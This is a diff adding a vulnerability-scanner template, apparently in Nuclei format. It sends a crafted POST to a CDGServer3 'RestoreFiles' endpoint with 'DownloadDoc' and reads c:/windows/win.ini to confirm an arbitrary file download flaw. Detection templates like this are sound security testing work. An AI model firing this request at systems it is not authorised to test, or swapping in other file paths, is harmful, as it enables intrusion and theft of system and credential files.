@@ -1,0 +1,27 @@
+id: msk-template
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/document/RestoreFiles;login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Connection: close
+        Content-Length: 68
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        command=DownloadDoc&fileNameForDownload=&downPath=c:/windows/win.ini
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body+all_headers,"[fonts]","attachment;filename") 
